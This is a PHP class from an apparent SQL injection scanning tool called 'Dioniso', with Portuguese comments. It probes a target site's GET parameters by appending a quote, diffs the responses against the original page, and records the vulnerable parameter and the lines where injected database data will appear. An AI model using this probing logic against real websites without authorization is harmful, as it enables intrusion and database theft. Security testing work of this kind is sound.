<?php
/**
 * Dioniso, Analysis tool safety
 *
 * LICENSE
 *
 * This source file is subject to the GNU General Public License that is bundled
 * with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://www.gnu.org/licenses/gpl-3.0-standalone.html
 *
 * @abstract   A classe abstrata Procurador_Estagiario_Abstract é responsável 
 *               por armazenar o HTML original do site para fazer a comparação de ataque e
 *               por localizar as coordenadas onde será encotrado os dados da injeção SQL.
 * @category   Models
 * @package    Main
 * @copyright  Copyright (c) 2013 José Roniérison <ronierison.silva@gmail.com>
 * @license    http://www.gnu.org/licenses/gpl-3.0-standalone.html GPL v3
 * @version    1.0
 * @date       14.07.2013
 */

abstract class Procurador_Estagiario_Abstract extends Procurador_Estagiario_Aprendiz_Abstract {
    /**
     * Código de identificação do arquivo de modelo. 
     * @todo Identificador, código único.
     */
    const codeFile = 2;
    
    /**
     * Linhas da página original (antes da inserção HTML)
     * @var @array of @strings
     */
    protected $_html_taglines;
    
    /**
     * Coordenadas: local onde será encontrado o valor buscado pelo insersor SQL
     * @var @array {
     *  $column => array{
     *   'line' => $line
     *  }
     * }
     */
    protected $_coordinates;
    
    /**
     * Variável $_GET que será a porta de entrada para o alvo
     * @String 
     */
    protected $_GETTarget;
    
    /**
     * Linhas de código achados para processamento de triagem: a key é a mesma
     * da linha onde fôra encontrado na HTML encontrado. 
     * @var array 
     */
    protected $_injectionDataLines;
    
    /**
     * @var String Url usada para atacar
     */
    protected $_command;
        
    /**
     * Recebe a URL enviada pelo usuário e salva a informação HTML enviada.
     * @string $url -> url (ex.: http://www.target.com.br/detalhe-noticia.php?id=1)
     * 
     * @return Procurador_Estagiario_Abstract
     */
    protected function saveCleanHTMLTags()
    {
        if(empty($this->_url)){
            throw new Exception('Impossível salvar os dados sem ter um endereço.', self::codeFile.'00001');
            return;
        }
        
        $clienteRequest = new Zend_Http_Client();
        $clienteRequest->setUri($this->_url);
    
        $httpResponse = $clienteRequest->request();
        
        //Se falhar ao buscar informações retorna o erro informado
        if(!$httpResponse->isSuccessful()){
            throw new Exception('Houve uma falha ao acessar o endereço. Erro: '.$httpResponse->getMessage(), self::codeFile.'00002');
            return;
        }
        
        $this->_html_taglines = explode('>', trim($httpResponse->getBody()));
        
        return $this;
    }
    
    /**
     * Descobre as coordenadas para localização dos dados requeridos
     * Necessita que as linhas da página já estejam salvas, do contrário é
     * lançado uma exceção.
     * Nessa etapa é possível saber se o site é vunerável a SQL Injection
     * e também é extraída informações para desocobrir a base de dados utilizada.
     * 
     * @param Array of Array of String $urlgetvar $array(0=>array('getvar', 'getvalue'));
     * @return Procurador_Estagiario_Abstract
     */
    public function discoverInjectionInfo($urlgetvar = null)
    {
        if(empty($this->_domain)){
            throw new Exception('Impossível fazer a varredura sem ter um domínio válido.', self::codeFile.'00003');
            return;
        }
        $urlvars = $urlgetvar;
        if($urlgetvar === null){
            $urlvars = $this->_url_variables;
        }
        
        $clienteRequest = new Zend_Http_Client();
        
        $this->_injectionDataLines = null;
        $this->_command = null;
        $this->_GETTarget = null;
        
        foreach($urlvars as $urlvar){
            $clienteRequest->resetParameters(true);
            
            $getValue = $urlvar[1].($urlgetvar === null ? "'" : '');
            
            $clienteRequest->setUri($this->_domain)
                ->setParameterGet($urlvar[0], $getValue);
            
            $httpResponse = $clienteRequest->request();
            
            if($httpResponse->isSuccessful()){
                $responseBody = explode('>', trim($httpResponse->getBody()));
                
                foreach($responseBody as $key => $tagline){
                    if(isset($this->_html_taglines[$key])){
                        if(array_search($tagline, $this->_html_taglines) !== false){
                            continue;
                        }
                    }
                    
                    $this->_command = $clienteRequest->getLastRequest();
                    $this->_GETTarget = $urlvar[0];
                    $this->_injectionDataLines[$key] = $tagline;                    
                }
                
                if($this->_injectionDataLines !== NULL){
                    break;
                }
            }
        }
        
        return $this;
    }
    
    /**
     * @return array of string -> Tags com informações normais do site
     */
    public function getHTMLTagLines()
    {
        return $this->_html_taglines;
    }
    
    /**
     * @return String -> retorna variável get usada como porta de entrada
     */
    public function getTargetGetVar()
    {
        return $this->_GETTarget;
    }
    
    /**
     * @return String -> Retorna URL usada para obter informações
     */
    public function getCommand()
    {
        return $this->_command;
    }
    
    /**
     * @return array -> Linhas com informação de SQL Injection
     */
    public function getDataHTMLSQLInjection()
    {
        return $this->_injectionDataLines;
    }
}
?>
